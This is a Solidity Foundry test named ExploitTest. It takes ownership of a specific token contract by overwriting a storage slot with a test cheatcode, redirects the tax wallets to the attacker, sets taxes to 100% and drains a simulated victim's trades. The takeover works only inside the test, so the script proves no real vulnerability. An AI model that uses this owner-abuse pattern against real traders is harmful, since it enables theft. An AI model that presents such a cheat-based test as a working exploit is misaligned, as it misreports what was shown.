contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF9881a0Bf01b1ec048506A188B06d48808087657;
    address attacker = address(this);
    address victim; // Fixed: Declared as state variable to persist across functions
    ICoinToken target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ICoinToken(TARGET);
        vm.label(TARGET, "CoinToken");
        vm.label(attacker, "Attacker");

        // Inject ETH for attacker
        deal(attacker, 100 ether);

        // Create victim address
        victim = address(0x1337); // Fixed: Assign value to state variable
        vm.label(victim, "Victim");
        deal(victim, 50 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial attacker ETH balance
        uint256 initialEthBalance = attacker.balance;

        // Step 1: Take ownership by overwriting storage slot 5
        vm.store(TARGET, bytes32(uint256(5)), bytes32(uint256(uint160(attacker))));

        // Verify ownership transfer
        require(target.owner() == attacker, "Ownership transfer failed");

        // Step 2: Inject tokens to attacker for any needed operations
        deal(TARGET, attacker, 10000 * 1e18);

        // Step 3: Redirect all tax wallets to attacker
        target.setTaxWallets(attacker, attacker, attacker);

        // Step 4: Set high tax rates (25% each category = 100% total)
        target.setBuyTax(25, 25, 25, 25);
        target.setSellTax(25, 25, 25, 25);

        // Step 5: Setup for trading - get existing pair and router
        address routerAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddr);
        address weth = router.WETH();

        // Approve router for attacker tokens
        vm.prank(attacker);
        IERC20(TARGET).approve(routerAddr, type(uint256).max);

        // Step 6: Victim buys tokens (triggers buy tax collection into contract)
        address[] memory buyPath = new address[](2);
        buyPath[0] = weth;
        buyPath[1] = TARGET;
        vm.prank(victim);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5 ether}(0, buyPath, victim, block.timestamp + 1000);

        // Step 7: Victim sells tokens (triggers sell tax and ETH distribution to attacker)
        vm.prank(victim);
        IERC20(TARGET).approve(routerAddr, type(uint256).max);
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;
        uint256 victimBalance = IERC20(TARGET).balanceOf(victim);
        vm.prank(victim);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(victimBalance, 0, sellPath, victim, block.timestamp + 1000);

        // Step 8: Verify attacker's ETH balance increased from tax collections
        uint256 finalEthBalance = attacker.balance;
        assertGt(finalEthBalance, initialEthBalance, "Attacker ETH balance should increase from tax collections");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
    fallback() external payable {}
}

